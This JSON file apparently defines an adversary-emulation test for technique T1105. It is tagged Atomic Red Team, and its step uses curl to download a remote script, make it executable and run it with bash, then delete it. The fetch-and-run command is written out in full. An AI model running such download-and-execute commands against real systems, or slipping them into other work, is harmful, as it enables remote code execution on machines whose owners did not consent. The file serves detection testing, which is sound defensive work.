{
  "id": "bdc373c5-e9cf-4563-8a7b-a9ba720a90f3",
  "name": "Linux Download File and Run",
  "description": "Utilize linux Curl to download a remote file, chmod +x it and run it.\n",
  "platforms": [
    "linux"
  ],
  "steps": [
    {
      "id": "6f4ce39c-38b4-4818-bc9e-b0b195f5f80a",
      "type": "execute-command",
      "data": {
        "command": "curl -sO #{remote_url}; chmod +x #{payload_name} | bash #{payload_name}\n",
        "command_type": "sh"
      },
      "elevation_required": false
    },
    {
      "id": "5d225594-e73a-401b-bf4b-e2eaf76233f4",
      "type": "execute-command",
      "data": {
        "command": "rm #{payload_name}\n",
        "command_type": "sh"
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "6f4ce39c-38b4-4818-bc9e-b0b195f5f80a",
      "p": "on-success",
      "o": "5d225594-e73a-401b-bf4b-e2eaf76233f4"
    },
    {
      "s": "6f4ce39c-38b4-4818-bc9e-b0b195f5f80a",
      "p": "on-failure",
      "o": "5d225594-e73a-401b-bf4b-e2eaf76233f4"
    }
  ],
  "tags": [
    "T1105",
    "atomic-red-team"
  ],
  "input_arguments": [
    {
      "name": "remote_url",
      "type": "string",
      "description": "url of remote payload",
      "value": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/src/atomic.sh"
    },
    {
      "name": "payload_name",
      "type": "string",
      "description": "payload name",
      "value": "atomic.sh"
    }
  ]
}